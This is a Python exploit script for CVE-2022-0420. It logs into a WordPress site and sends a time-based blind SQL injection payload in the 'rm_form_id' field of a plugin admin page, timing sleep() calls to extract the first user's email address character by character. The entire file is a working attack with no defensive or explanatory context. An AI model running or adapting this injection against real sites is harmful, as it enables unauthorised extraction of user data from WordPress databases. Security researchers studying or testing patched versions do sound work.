# Author : Qerogram
# DATE : 2022-01-29
# CVE-2022-0420 exploit

import requests
import time

BASE_URL = "http://localhost:8000"
id = "wordpress"
pw = "wordpress"

def login(id, pw) :
    sess = requests.Session()
    sess.post(
        BASE_URL + "/wp-login.php",
        data = {
            'log': id,
            'pwd': pw,
            'wp-submit': '%EB%A1%9C%EA%B7%B8%EC%9D%B8',
            'testcookie': '1'
        }
    )
    return sess


def trigger(sess, time_value) :
    
    for idx in range(1, 19) :
        for i in range(0x20, 0x7f) :
            start = time.time()
            sess.post(
                BASE_URL + "/wp-admin/admin.php?page=rm_ex_chronos_manage_tasks",
                data = {
                    "rm_form_id" : f"(select if(ord(substr(user_email,{idx},1))={i},sleep({time_value}),sleep(0)) from wp_users limit 0,1)"
                },
                proxies = {"http":"http://localhost:8080"}
            )
            
            if time.time() - start > time_value:        
                print(chr(i))
                break
        

sess = login(id, pw)
trigger(sess, 0.2)